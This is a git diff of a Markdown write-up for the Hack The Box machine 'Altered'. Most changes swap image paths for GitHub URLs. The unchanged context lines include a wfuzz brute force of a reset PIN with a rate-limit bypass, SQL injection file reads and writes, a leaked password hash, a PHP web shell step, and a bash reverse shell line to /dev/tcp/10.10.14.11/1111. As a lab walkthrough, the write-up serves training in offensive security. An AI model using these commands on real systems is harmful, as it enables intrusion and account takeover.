@@ -1,13 +1,13 @@
-![](altered%20logo.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/altered%20logo.png)
 
 # nmap
 ## nmap all ports
 ````bash
-nmap -p- --min-rate 1000 -T 4 -v -oN nmap-all-ports 10.10.11.159 
+nmap -p- --min-rate 10000 -T 4 -v -oN nmap-all-ports 10.10.11.159 
 
 `````
 
-![](Altered/screenshots/nmap%20all%20ports.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/nmap%20all%20ports.png)
 
 ## nmap versions and services
 ````bash
@@ -15,33 +15,33 @@ nmap -sCV -p 22,80 -oN nmap-services-versions -v 10.10.11.159
 
 `````
 
-![](Altered/screenshots/nmap%20versions%20and%20services.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/nmap%20versions%20and%20services.png)
 
 # domain
 ## main domain login
-![](main%20domain%20login.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/main%20domain%20login.png)
 
-![](login%20user%20admin%20exists.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/login%20user%20admin%20exists.png)
 
-![](login%20user%20user%20not%20existence.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/login%20user%20user%20not%20existence.png)
 
 
 ## forgot password
-![](login%20forgot%20password.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/login%20forgot%20password.png)
 
-![](login%20forgot%20password%20pin.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/login%20forgot%20password%20pin.png)
 
 
 # burpsuite
 ## cookie laravel_session
-![](cookie%20laravel%20session.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/cookie%20laravel%20session.png)
 
 
 ## google laravel session indicates to php framework
-![](google%20laravel%20session.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/google%20laravel%20session.png)
 
 ## url --> php
-![](index.php.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/index.php.png)
 
 # brute force 4 digits pin
 ## wfuzz
@@ -52,10 +52,10 @@ wfuzz -z range,0000-9999 -u "http://10.10.11.159/api/resettoken" -H "Cookie: XSR
 
 ## response suddenly changes from 200 to 429 --> too many requests
 ![](Altered/screenshots/wfuzz%20brute%20force%20pin.png)
-![](wfuzz%20brute_force%20pin.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/wfuzz%20brute%20force%20pin.png)
 
 
-![](headers%20to%20change%20location.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/headers%20to%20change%20location.png)
 
 # rate-limit bypass
 
@@ -72,7 +72,7 @@ wfuzz -z range,0000-9999 -w iptable -u "http://10.10.11.159/api/resettoken" -H "
 
 `````
 
-![](wfuzz%20brute%20force%20pin%201.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/wfuzz%20brute%20force%20pin%201.png)
 
 
 ````bash
@@ -83,39 +83,39 @@ wfuzz -z range,0000-9999 -w iptable -u "http://10.10.11.159/api/resettoken" -H "
 `````
 
 ## wfuzz without filter
-![](wfuzz%20unfiltered.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/wfuzz%20unfiltered.png)
 
 ## wfuzz: filter amount chars --> valid pin?
-![](valid%20pin.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/valid%20pin.png)
 
 ## login dashboard
-![](login%20dashboard.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/login%20dashboard.png)
 
 ## burpsuite dashboard
-![](burpsuite%20login%20dashboard%20secret%20parameter%20initial.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20login%20dashboard%20secret%20parameter%20initial.png)
 
-![](burpsuite%20login%20dashboard%20tampering%20detected.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20login%20dashboard%20tampering%20detected.png)
 
-![](burpsuite%20convert%20query%20parameter%20to%20json.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20convert%20query%20parameter%20to%20json.png)
 
-![](burpsuite%20type%20juggling.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20type%20juggling.png)
 
-![](burpsuite%20sqli.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20sqli.png)
 
-![](burpsuite%20sqli%20union%20with%20existence%20id.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20sqli%20union%20with%20existence%20id.png)
 
 
-![](burpsuite%20sqli%20union%20with%20notexistence%20id.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20sqli%20union%20with%20notexistence%20id.png)
 
-![](burpsuite%20sqli%20union%20write%20data.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20sqli%20union%20write%20data.png)
 
-![](burpsuite%20sqli%20extract%20data.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20sqli%20extract%20data.png)
 
-![](burpsuite%20extract%20even%20more%20data.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20extract%20even%20more%20data.png)
 
-![](burpsuite%20extract%20all%20databases%20one%20by%20one.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20extract%20all%20databases%20one%20by%20one.png)
 
-![](burpsuite%20extract%20all%20databases%20group_concat.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20extract%20all%20databases%20group_concat.png)
 
 ## extract data from uhc database
 ````mysql
@@ -126,7 +126,7 @@ wfuzz -z range,0000-9999 -w iptable -u "http://10.10.11.159/api/resettoken" -H "
 
 ````
 
-![](burpsuite%20extract%20uhc%20database.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20extract%20uhc%20database.png)
 
 ````mysql
 
@@ -136,11 +136,11 @@ wfuzz -z range,0000-9999 -w iptable -u "http://10.10.11.159/api/resettoken" -H "
 
 
 
-![](burpsuite%20extract%20uhc%20database%20and%20prittify.png)
+![]https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20extract%20uhc%20database%20and%20prittify.png)
 
 
 ### extract users:name + users:password
-![](burpsuite%20extratct%20names%20+%20passwords.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20extratct%20names%20%2B%20passwords.png)
 
 ````mysql
 
@@ -150,7 +150,7 @@ wfuzz -z range,0000-9999 -w iptable -u "http://10.10.11.159/api/resettoken" -H "
 
 `````
 
-![](burpsuite%20sqli%20extract%20users%20and%20passwords.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20sqli%20extract%20users%20and%20passwords.png)
 
 ````bash
 
@@ -166,7 +166,7 @@ admin:$2y$10$wqBKWXLDzqQ3aMmKDumGx.2Sz31z0XE4uPOBmSLOoMY9cqgvHpYgW
 
 `````
 
-![](burpsuite%20sqli%20LOAD_FILE().png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20sqli%20LOAD_FILE().png)
 
 ## grasp nginx config file
 ````
@@ -175,7 +175,7 @@ admin:$2y$10$wqBKWXLDzqQ3aMmKDumGx.2Sz31z0XE4uPOBmSLOoMY9cqgvHpYgW
 `````
 
 ## root is @ /srv/altered/public
-![](burpsuite%20sqli%20get%20nginx%20config%20file.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20sqli%20get%20nginx%20config%20file.png)
 
 ## sqli write to file
 ````
@@ -187,7 +187,7 @@ admin:$2y$10$wqBKWXLDzqQ3aMmKDumGx.2Sz31z0XE4uPOBmSLOoMY9cqgvHpYgW
 ![](sqli%20write%20file%20succesfull.png)
 
 ### server error while writing file because sql retrieves no colum back
-![](burpsuite%20sqli%20write%20file.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/sqli%20write%20file%20succesfull.png)
 
 ### php web shell
 ````mysql
@@ -195,18 +195,18 @@ admin:$2y$10$wqBKWXLDzqQ3aMmKDumGx.2Sz31z0XE4uPOBmSLOoMY9cqgvHpYgW
 
 `````
 
-![](mysql%20to%20php%20web%20shell.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/mysql%20to%20php%20web%20shell.png)
 
 ### burpsuite get request changed to post request
-![](burpsuite%20reverse%20shell.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/burpsuite%20reverse%20shell.png)
 ````bash
 cmd=bash -c 'bash+-i+>%26+/dev/tcp/10.10.14.11/1111+0>%261'
 
 `````
 ## shell
-![](shell%20as%20www-data.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/shell%20as%20www-data.png)
 
-![](list%20kernel%20version.png)
+![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Altered/screenshots/list%20kernel%20version.png)
 
 ### google search for exploit --> dirty pipe
 ![](Pasted%20image%2020221001004741.png)
